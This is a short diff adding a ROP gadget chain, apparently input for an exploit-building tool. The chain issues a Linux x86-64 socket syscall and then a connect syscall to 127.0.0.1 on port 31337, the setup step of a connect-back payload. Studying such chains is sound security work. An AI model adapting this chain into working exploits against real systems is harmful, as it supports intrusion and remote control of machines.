@@ -1,0 +1,23 @@
+; socket syscall
+g: pop rdi; ret
+d: 0x02
+g: pop rsi; ret
+d: 0x01
+g: pop rdx; ret
+d: 0x06
+g: pop rax; ret
+d: 0x29
+g: syscall; ret
+
+; connect syscall
+g: mov rdi, rax; ret
+; r10 is used as a throwaway gadget
+g: mov rsi, rsp; pop r10; ret
+; IP address: 0100007f = 127.0.0.1
+; Port: 697a = 31337
+d: 0x0100007f697a0002
+g: pop rdx; ret
+d: 0x10
+g: pop rax; ret
+d: 0x2a
+g: syscall; ret
